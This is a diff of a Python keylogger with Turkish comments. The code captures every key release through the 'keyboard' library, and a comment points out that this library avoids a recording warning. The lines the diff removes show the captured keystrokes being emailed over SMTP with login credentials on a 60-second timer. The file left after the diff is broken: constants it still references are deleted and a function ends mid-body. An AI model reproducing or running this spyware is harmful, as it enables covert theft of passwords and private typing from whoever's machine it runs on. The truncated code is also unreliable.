@@ -1,15 +1,8 @@
-import keyboard #pynput kullanilabilir fakat "keyboard recording" uyarisi verir!
+import keyboard
 import smtplib
 from threading import Timer
 from datetime import datetime
 import sifre
-
-MAIL_USER = "MAIL ADDRESSINIZI GIRIN" 
-MAIL_SIFRE = "MAIL SIFRENIZI GIRIN" 
-MAIL_SMTP = "smtp.ethereal.email" #Ethereal Örnegidir
-SMTP_PORT = 587 # Ethereal Portudur
-RAPOR_SURE = 60 # loglarin mail ile atilma süresini düzenler
-RAPOR_TIPI = "mail" # "mail" veya sadece kayit icin "dosya" tercih edilebilir!
 
 class Keylogger:
     def __init__(self, sure, rapor):
@@ -47,8 +40,6 @@ class Keylogger:
                 name = "[SOL_TUS]"
             elif name == "up":
                 name = "[ÜST_TUS]"
-        #elif name == " ":
-            #name = "[BOSLUK]"  # BOSLUK YERINE [BOSLUK] YAZMASINI SAGLAR
         self.log += name
 
 
@@ -65,33 +56,4 @@ class Keylogger:
     def mail_gonderme(self, icerik, mail=MAIL_USER, sifre=MAIL_SIFRE):
         server = smtplib.SMTP(host=MAIL_SMTP, port=SMTP_PORT)
         #TLS modunda sifreleme icin :
-        server.starttls()
-        server.login(mail, sifre)
-        server.sendmail(mail,mail,icerik.encode('utf-8'))
-        server.quit()
-
-    def icerik(self):
-        if self.log:
-            self.dosya_isimlendir()
-            self.dosya_olustur()
-            if self.rapor == "mail":
-                self.mail_gonderme(self.log, MAIL_USER,MAIL_SIFRE)
-            elif self.rapor == "dosya":
-                self.dosya_olustur() #yönlendirme eklenebilir
-            print(f"[{self.dosya_adi} icine yazdirildi: {self.log}") # Terminalde yazdirilan loglari görme
-            self.baslangic = datetime.strftime(datetime.today() , '%d-%m-%Y-%Hh-%Mm')
-
-        zamanlayici = Timer(interval=RAPOR_SURE, function=self.icerik) # Multithread yapmasi icin zamanlayici döngü
-        zamanlayici.daemon = True
-        zamanlayici.start()
-        self.log = ""
-
-    def baslat(self):
-        self.baslangic = datetime.strftime(datetime.today() , '%d-%m-%Y-%Hh-%Mm')
-        keyboard.on_release(callback=self.tus_yakalama)
-        self.icerik()
-        keyboard.wait()
-
-if __name__ == "__main__":
-    logger = Keylogger(sure=RAPOR_SURE, rapor=RAPOR_TIPI)
-    logger.baslat()
+       
